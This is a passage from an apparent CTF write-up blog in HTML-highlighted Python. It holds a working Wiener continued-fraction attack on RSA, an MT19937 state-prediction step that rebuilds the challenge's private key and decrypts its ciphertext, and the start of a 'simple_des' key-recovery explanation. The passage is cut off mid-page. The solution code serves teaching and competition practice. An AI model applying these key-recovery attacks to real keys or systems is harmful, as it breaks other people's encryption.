class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    Finds d knowing (e,n)</span></span><br><span class=\"line\"><span class=\"string\">    applying the Wiener continued fraction attack</span></span><br><span class=\"line\"><span class=\"string\">    &#x27;&#x27;&#x27;</span></span><br><span class=\"line\">    frac = ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class=\"line\">    convergents = ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (k, d) <span class=\"keyword\">in</span> convergents:</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># check if d is actually the key</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> k != <span class=\"number\">0</span> <span class=\"keyword\">and</span> (e * d - <span class=\"number\">1</span>) % k == <span class=\"number\">0</span>:</span><br><span class=\"line\">            phi = (e * d - <span class=\"number\">1</span>) // k</span><br><span class=\"line\">            s = n - phi + <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"comment\"># check if the equation x^2 - s*x + n = 0</span></span><br><span class=\"line\">            <span class=\"comment\"># has integer roots</span></span><br><span class=\"line\">            discr = s * s - <span class=\"number\">4</span> * n</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (discr &gt;= <span class=\"number\">0</span>):</span><br><span class=\"line\">                t = Arithmetic.is_perfect_square(discr)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> t != -<span class=\"number\">1</span> <span class=\"keyword\">and</span> (s + t) % <span class=\"number\">2</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">                    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Hacked!&quot;</span>)</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> d</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">attack</span>(<span class=\"params\">n, e</span>):</span><br><span class=\"line\">    d = hack_RSA(e, n * n)</span><br><span class=\"line\">    k = (e * d - <span class=\"number\">1</span> + n * n) // (n * n)</span><br><span class=\"line\">    tmp = (n * n) - ((e * d - <span class=\"number\">1</span>) // k) + <span class=\"number\">1</span> + <span class=\"number\">2</span> * n</span><br><span class=\"line\">    ppq = <span class=\"built_in\">int</span>(iroot(tmp, <span class=\"number\">2</span>)[<span class=\"number\">0</span>])</span><br><span class=\"line\">    tmp = (n * n) - ((e * d - <span class=\"number\">1</span>) // k) + <span class=\"number\">1</span> - <span class=\"number\">2</span> * n</span><br><span class=\"line\">    pmq = <span class=\"built_in\">int</span>(iroot(tmp, <span class=\"number\">2</span>)[<span class=\"number\">0</span>])</span><br><span class=\"line\">    p = <span class=\"built_in\">int</span>(gcd(ppq + pmq, n))</span><br><span class=\"line\">    q = n // p</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> p * q == n</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> e*d % ((p-<span class=\"number\">1</span>) * (q-<span class=\"number\">1</span>)) == <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> p, q, d</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">ss = <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">9664150901450480967690564598017074925278657678428083526647019231493500227501186171121223353625264405549895808023865076405682104148869646937802710197692149880801739296224423720449697986562014962810427149274953670336431969720847239367252577312181797620406921597928891203908280967606801144879943997948288687269135451721341591758893489869339520600383114702594831680556978281938914417626897063741811649257614797234325708166759403120480173752153249168733044607204951768557734895758143808863754965572034240739588491294098941537522398891830128387438317592253663045532862058982832135946842401711673333170801808131328328138409</span></span><br><span class=\"line\"><span class=\"string\">22983334574580917801180860838975915911056113991786778412831201182411314364399816331219602816987801515703576764159087708450625423803558017646160341422267439951044407124414015864769966876129437519084492109510818093789724685834745254039500061544494687297354628168281982577957457924120597256869151402144742486005161738151255767127578010682514603747674732192539709537275806788688798050708598638377916842971631011263261195175705071683872373603843884113967910301479453532836470974019712063094982740534667039293541440015250164631599817949388195744930270131276498157477215483242544464596689268807389029069272532067490083369547669715239977992410158704220313287358936476570197236442784273557421888378497464433353892887766426339418782876390919046890278793088868131975197880580905027785352428189007480894687391277338836087221071379217489414415183919425962364501612704379275059469144794211736312560265881110693864711202763941138206607689382712402597791806706502788925221170513306681258576676019323627743632448114452443097397014141839634039981951855535241851424638689366379545342739319677785567174640217613527540438283508170772807801142587539976048845517400474132948151081974542377578704999265763979523387588936804746887912462709543565738342209411</span></span><br><span class=\"line\"><span class=\"string\">26421545185254987799905424190746332339125127121314171591428976353667115363763727486775614091903284658438097216623238914712478521157241139537987344330841699472419239411492271130318030306609434654284036687937944162679104946235126178521045633190386482424340322162024092955319660759058652161996411895209248718547013152501979160191126988501306653660575206430331327547695958573346502447806907651886805983227927733506487689107733064048662109346548423844168211328529388196436068858018422470472568131170937800147226367812703244919615304030171460050297573510835520868630853149705239212069246257510861666696541821151818169796199</span></span><br><span class=\"line\"><span class=\"string\">647587495710510972114742400831708548154715412535242193260921609695347930936707036639358968164012520349909437957090794941485190580257732521977171932341037504324231632999867734166481147062308183081010136684146530539354916263125020063213571051436518584206830118093755508481812082245822690944819197599760354341006609736609770789666793064642703641481389320623277678173558301629672865116377269127942025612180794827944539599815847863105760862109828389140681525680276554276533927094628602058843675286071339454429465986971694907927688830239142611855187274379851523189108755859657533224271693320278278605425423386495384174568562497627761612422045791957059437741493328698509481368554006456683812993984891378698935039540883929464645807942966456158605263661813471703445078327854656000079848297587266423318192874967873522951070558487797128927313745909508734015212545363132719971877683921675395438436594169300084386617636244174085949981341272801441913192529055922603538974179887610571219493524648953191928761783132985310317276631200614903232826609021472846793881344295699985919781942936761500592413666531213913327520376681809371295266029776133655277736129022073066033964950152867511761886746401418419578828754174047939112010456150675463575657509189</span></span><br><span class=\"line\"><span class=\"string\">10802012890829459540541628896792295078778436077857489427389981093725666739897304883046269390863878441152550000748160396908161524179907858077000487740264046477305439871796448601143325277932003810352123707096051383675738121180861345577006541031517155258339948241289482502904363911440323113072882087374540321696726636204227138558487828152291517517119224906926633391353300941778394425937626996455545868331674490267329118395561623628314372766364381142098697604044336132503664081692651614933878766623288150407771680698950374395680226687162951709227319486379639675961227436372862323642542582705252736363789548988448924281523</span></span><br><span class=\"line\"><span class=\"string\">83164181286675647518830286473660936842056768837605965773754722828164869255002601931877175384944967168423206258868966986144360226269117391889938003716473472419177908278255032274351977454805821764218411534787094767284216135276174354406996436906142025032430967949150772284199385705263345050808935420677789360168112630311736817620156906081165474809562107538852267394278439066621108665747312736533966159229107173152465365414052064089548384023025856375904149686916115214912086305308341266693329116385815754412736749978601321323191864143850174315828039788320203726197797788026323483995092501876361540056171546433345056509023822723392649116651071369395319931930221212866085340561430347693225966408351502938942294604586300299982831155358938495260400185484497256896416324370391657125309375755376057180940858375964786733652546488880996426657064631708252560023474877949301792612429382653730100520713338044964401333750090947037843448152614531864695601400078878276612572266304350518364495335341275038759497131064447619421326513680343303115330200681996349441238490209605256140282866353360785265474868465131016931425931964393177163140173169398499291572984733338118081910704432753107524477347843354958141041369207588577081612844623302487399941453933</span></span><br><span class=\"line\"><span class=\"string\">7896711153350680182046433804310163873530744638818895739714243668607588547792890005637528789452971314751693622472528149754510450552025972279187841776097749142749323304216218612718765727398943401294644022496938258864873262044174164494124912426175372524656376121897875690251938452930789747994519674300862595216275541928658146402252536829579922303097776404657455395450853161185534506599329499328761065707811197966475148318482438088816924842458585192796056395380885795831624193355572079389648572361687920747403086875781493091238221420792111039898275872964722825166960441004965842026859265796562573640732063541877035703999</span></span><br><span class=\"line\"><span class=\"string\">2453336941794377920668315851654619953646928905461467141099094168657719206064766651951427088886039685796776114141822989089619723777926424614857001633051068225552956142083890497598873667557028446871021184458240143729566494812770661669240646268836255291274950055880283884837660674102748619167688728015214974199172102739298082411466099956770246119223362727103493898761907722553589378295675272645561934551025890703140999463094569248990423646872411723328409457823533926161366175638210485154684713670484074111551184519212764546709551586814178654768531770178427218348159524090067132668379834207556749709109588553767744958928030458642933207972731738889836640270310522407082557073074220327314630716521374036182110178874650024321686921170512401592772523798249960102467660742850794643617416339049505280450162445401270432730440216281390479357051798091526529334107226924555476475287445348397336720445992548926807772402601594999910439716972523884323110378738095230641354005535939595738498325951885080299526970515488294162554370726438356887387936240973624985584430961461016270437469408900537013699409622145224578929157293051142754994365105441300293953769949427089080402762107252481674439414260001163630002002209227608718701864539764471854120765149</span></span><br><span class=\"line\"><span class=\"string\">934357599818997062963713308304362991596280828009512110755774617078887165360994483469754259794232045134748049571365890970600399733065188159532911208357285158307632045436603686477662110964558434302467120269827088523605436776745307435600233303494688594128265424710248665574421617599397235608386293736009112635240116363197127688715563025691804376760043956191129689115106451454594303458289356459242344139405236999049625726629507017505219076937886664753583057499783039263793580691707653961619033353122066993401993412281067305045569711817510917816670267012976388544311131447428560310255424118434372129058504068971704509583</span></span><br><span class=\"line\"><span class=\"string\">452535985385426610533595291636837260029529161119012527028832154063118066054114365212225611604413376466306821291622206453481076548722964431496720642815073434660316751461773927736769380260565572635521865666418131804097223787559572584034429232767907408588386908627811135292858626656533240022150603513420578118687227948584091074426900135895322629439907454314781910440178440833975308243442451505929901732597325250942477885257392248372956797459556418043140426549205059992693832494817312609114820874540542115879517751481239945773745036685837555782445189562031306229705420041083026014508308653365829010341657395972738383225136782775802242507679530114388408690163501378818581259836086658314750295168292063413234606975054845567353768299988855117672810051088400466976103022087953981820980574159918396071750775318139479271235473733328684536087473478158695154228827351532739332906517313798270187902326156179644850383883874005798210565002897279183014905697229418005561458301283927876097634598729273370887688127716799146589959547718296529504218197024144569252951455907047844555593109642331128337551457131825334129476995668564725114284200611621984522440766436051246003019078387721989410126014046300337526406832227661211670511374666171933242207761</span></span><br><span class=\"line\"><span class=\"string\">21636726262954983891798049753528884949149278107055957653804164122232750629108771687361858365462276461758050089339414649308189481865701469685971089624677686415038790141344992019067961279901006021154460525723482009962909666812029094177916225260557575750852951983028595026985975759287231315896982867941386247369741207715929550901277459410981688464120324580668604126829385737148142010733680106833740158713528050751799693988082141485112234559239865511692418065113774817308071898684749289577274638116406277808547134140659187860357703459236546455683700089064295899984063024669612762793525503212165546539776762359198804880143</span></span><br><span class=\"line\"><span class=\"string\">121831222096537368999356089708412896046021123796479990498164844552933248218587707868671273702871780046383065460423688141024214392817157791234305056319786064285936708392236448824783787802429682770337272235088202671105152535710294695902974253047704609221448981405609532633533062373004757059178427305919782441807444728003944125735197038228206500793881947731683045961796477046714111614358449413877923492947221540637411996522154279667079850899812790025430709528400798251289702825878302828745393493824877531623611021252456356175891394204733580270256164603165280954431866062942260146653644302782243197898971847034949620717936360716813922698249012591248773536863924987646374098897933678199676635398286431303649466386258192966901198806753276444091301228010214339088108290023638595922653691209504127688631013840850339138278703745938757018854197798962009892613282181507128330931048662067002367216863617848322567299023690624245593206164105677495564960539642415302357595708814138558968835481632687790665010565719903412940128287504825368916534220790908431745824689253975485426199665419413293026825301727942248672409218671101407001619695622271079059718159320809385046289813332457898242478875287662049306326128127096487004090260965504341859573161979</span></span><br><span class=\"line\"><span class=\"string\">5970296459863639263155783075172703907538560676961520474432385024839627916414414908656192009767702560571700661568202705725697718102111106038786955170270219508803648130754658135536335026559679753140733217830203813331793926165711104662514382832955840370630723176415927796955765169553517462286240424922177248496576208476937262840173500549507825256850681559103373575719799534073745792805709350898345377043444572387322205792026096379146084848266043619559701164699491546970266459037417312873294970955821603622312389603295515738649074112877256884131342394799593566008925579319817453597162465762851343362551362340193519234111</span></span><br><span class=\"line\"><span class=\"string\">18976399709138358912615581289803736063685392526627126047585536571255137591890898469016131796862155245718632726865355864471577906314641282253655270136097246496157189183315479252842675388863506996293537386049856520375327248649829502157752917745660189131281987348802723603782945921331000190785525591621756168923822951821404353646825235167866284344617268886872941218738132870839917479807740404673373159559070563008075098345562213387428585134527952927397372161736924000067060148836364979179350873731455181407191524960955000331041112836325967730682314802564504793245212062165765383998948417925582958872582993455246869810367559513521188245827564742949660925007994864642588404989913088438650029238240908588039032304578884090105469536379896758734713314973495243747985470691862911913134723349279860545443973275726615548263752591810660223834517909123784767147753948727361870320431446223866316111276171603492135128216357176021812643706643763587976997347084988208779018873039456862231395447809853586521609100405013300467752808797446255256509955396709060833818059140619116092459497493686455825427088609805918612964163855925495410440760559642006382819680630706627333218589739634830096224810601690036163130895447446190737732854075739908518171940791</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span>.strip().split()</span><br><span class=\"line\">arr = <span class=\"built_in\">list</span>(<span class=\"built_in\">map</span>(<span class=\"built_in\">int</span>, ss))</span><br><span class=\"line\">xx = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">    n = arr[<span class=\"number\">2</span>*x]</span><br><span class=\"line\">    e = arr[<span class=\"number\">2</span>*x + <span class=\"number\">1</span>]</span><br><span class=\"line\">    xx.append(attack(n, e))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(xx)</span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\">global_bits = <span class=\"number\">1024</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> extend_mt19937_predictor <span class=\"keyword\">import</span> ExtendMT19937Predictor</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> p, q, d <span class=\"keyword\">in</span> xx:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(p &amp; <span class=\"number\">0xffffffff</span>), <span class=\"built_in\">hex</span>(q &amp; <span class=\"number\">0xffffffff</span>), <span class=\"built_in\">hex</span>(d &amp; <span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(p.bit_length(), q.bit_length(), d.bit_length())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">len</span>(xx))</span><br><span class=\"line\"><span class=\"keyword\">for</span> xt <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">2</span> ** <span class=\"number\">7</span>):</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        predictor = ExtendMT19937Predictor()</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> xt &amp; (<span class=\"number\">1</span> &lt;&lt; i):</span><br><span class=\"line\">                predictor.setrandbits(xx[i][<span class=\"number\">0</span>] &gt;&gt; <span class=\"number\">32</span>, global_bits - <span class=\"number\">32</span>)</span><br><span class=\"line\">                predictor.setrandbits(xx[i][<span class=\"number\">1</span>] &gt;&gt; <span class=\"number\">32</span>, global_bits - <span class=\"number\">32</span>)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                predictor.setrandbits(xx[i][<span class=\"number\">1</span>] &gt;&gt; <span class=\"number\">32</span>, global_bits - <span class=\"number\">32</span>)</span><br><span class=\"line\">                predictor.setrandbits(xx[i][<span class=\"number\">0</span>] &gt;&gt; <span class=\"number\">32</span>, global_bits - <span class=\"number\">32</span>)</span><br><span class=\"line\">            predictor.setrandbits(xx[i][<span class=\"number\">2</span>] &gt;&gt; <span class=\"number\">32</span>, global_bits - <span class=\"number\">32</span> - <span class=\"number\">32</span>)</span><br><span class=\"line\">        <span class=\"comment\"># d = predictor.predict_getrandbits(global_bits - 32)</span></span><br><span class=\"line\">        <span class=\"comment\"># print(d)</span></span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> ValueError:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(xt)</span><br><span class=\"line\">        <span class=\"keyword\">del</span> predictor</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> gmpy2 <span class=\"keyword\">import</span> next_prime, invert <span class=\"keyword\">as</span> inverse_mod</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Cipher <span class=\"keyword\">import</span> PKCS1_v1_5</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.PublicKey <span class=\"keyword\">import</span> RSA</span><br><span class=\"line\"><span class=\"keyword\">from</span> random <span class=\"keyword\">import</span> getrandbits</span><br><span class=\"line\"><span class=\"keyword\">from</span> math <span class=\"keyword\">import</span> lcm</span><br><span class=\"line\"><span class=\"keyword\">from</span> sys <span class=\"keyword\">import</span> exit</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">generate_prime</span>(<span class=\"params\">bits: <span class=\"built_in\">int</span></span>):</span><br><span class=\"line\">    p = (predictor.predict_getrandbits(bits - <span class=\"number\">32</span>) &lt;&lt; <span class=\"number\">32</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> next_prime(p)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">generate_private_key</span>(<span class=\"params\">bits: <span class=\"built_in\">int</span></span>):</span><br><span class=\"line\">    q, p = generate_prime(bits), generate_prime(bits)</span><br><span class=\"line\">    n, phi = p * q, lcm(p-<span class=\"number\">1</span>, q-<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(p.bit_length(), q.bit_length())</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(p &amp; <span class=\"number\">0xffffffff</span>), <span class=\"built_in\">hex</span>(q &amp; <span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">    d = inverse_mod(<span class=\"number\">0x10001</span>, phi)</span><br><span class=\"line\">    privateKey = RSA.construct((<span class=\"built_in\">int</span>(n), <span class=\"built_in\">int</span>(<span class=\"number\">0x10001</span>), <span class=\"built_in\">int</span>(d), <span class=\"built_in\">int</span>(p), <span class=\"built_in\">int</span>(q)))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> privateKey, p &gt; q</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">privateKey, signal = generate_private_key(global_bits)</span><br><span class=\"line\">Cipher = PKCS1_v1_5.new(privateKey)</span><br><span class=\"line\">cc = <span class=\"string\">b&quot;\\x02\\x81\\xbe\\x9e^\\xdc2\\xf6V~\\x98 \\x97\\x125\\xa2-\\xe3gal\\x96\\x02\\xba\\xe8\\xaaN*\\xce\\xe98\\x8eAhSNz\\x08;Vb\\xe0\\x9d\\xe2\\x15\\xf6\\x12\\xd6\\xe5&#x27;a\\xc0\\rt\\r+\\xa4_\\xaa\\x19\\xc4\\x97&gt;\\xa1\\r\\x14\\x18\\xfe\\xd4\\xa8~d\\xfe\\x9d\\x95&gt;\\x0f\\x84\\xfa/p\\xfa\\x91\\x070\\xd1\\xa64\\xb2N\\x9a\\xe9\\x01\\xe9\\x91\\xa58\\x81\\xb2\\\\H&amp;B\\xcc\\xde\\xe8|\\x87\\xed\\x0e)\\xd3\\xde\\x93f\\xa5\\x0e\\xecv\\x9c\\xcea%\\x85\\x9e\\xb8\\x10\\x9ea\\xdfnME\\x18i\\xab,\\x96&#123;\\xab\\xf3i\\xa9I\\xc2\\xbb\\xac\\x81\\x12\\x04\\xf4J8N\\xfbE\\x0fp.P\\x9b\\xacrX\\xc1Hk\\xff-&gt;\\x9b\\xd99\\xd2L\\xc2\\x849*\\xfa\\xf3&gt;\\x8c&amp;23\\xceu\\xb7\\xf7\\xa2\\x81\\x15\\xacOX&#125;\\xd3t\\xa6T\\x1b7\\xa9\\xf6\\x163\\x96\\xa1\\xe1\\xd7\\xb3e\\xccB\\x9a\\xee\\x83B|\\x92E&gt;C\\xfb\\xd5\\xc5\\xe3#\\xa514\\xa0\\x1b\\x03\\xbf\\xf6\\xb3\\x1bK\\xa2=\\xaf3\\x03w\\x91\\xdeU\\xb51Y&#125;%\\x89\\x00&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(Cipher.decrypt(cc, <span class=\"literal\">None</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"simple-des\"><a href=\"#simple-des\" class=\"headerlink\" title=\"simple_des\"></a>simple_des</h2><p>爆破9位恢复L，之后逆推下面这个操作即可恢复L，R的初始，由于LR来自key其中的56位，所以只要知道key的56个bit即可</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">16</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(ROTATIONS[i]):</span><br><span class=\"line\">        L.append(L.pop(<span class=\"number\">0</span>))</span><br><span class=\"line\">        R.append(R.pop(<span class=\"number\">0</span>))</span><br></pre></td></tr></table></figure>\n\n<p>exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span 